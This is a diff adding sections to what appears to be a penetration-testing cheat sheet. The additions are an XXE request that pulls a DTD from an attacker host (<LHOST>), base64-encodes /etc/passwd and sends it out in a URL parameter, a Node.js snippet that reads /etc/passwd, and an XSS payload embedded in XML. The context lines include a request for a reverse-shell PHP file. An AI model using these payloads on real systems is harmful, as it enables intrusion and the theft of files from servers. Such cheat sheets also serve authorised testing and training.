@@ -220,6 +220,55 @@ req.open('GET',"http://<TARGET_URL>/revshell.php");
 req.send();
 ```
 
+### XML External Entity (XXE)
+
+#### Request
+
+```c
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
+"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
+<root>
+<method>GET</method>
+<uri>/</uri>
+<user>
+<username><NAME>;</username>
+<password><NAME></password>
+</user>
+</root>
+```
+
+#### Content of <FILE>.dtd
+
+```c
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+### Cross-Site Scripting (XSS)
+
+#### JavaScript to read Files on the System (.js)
+
+```c
+const fs = require('fs');
+
+fs.readFile('/etc/passwd', 'utf8', (err, data) => {
+  if (err) throw err;
+  console.log(data);
+});
+```
+
+#### Payload from XML File
+
+```c
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+```
+
 ## 04 Database Assessment
 ## 05 Password Attacks
 ## 06 Wireless Attacks
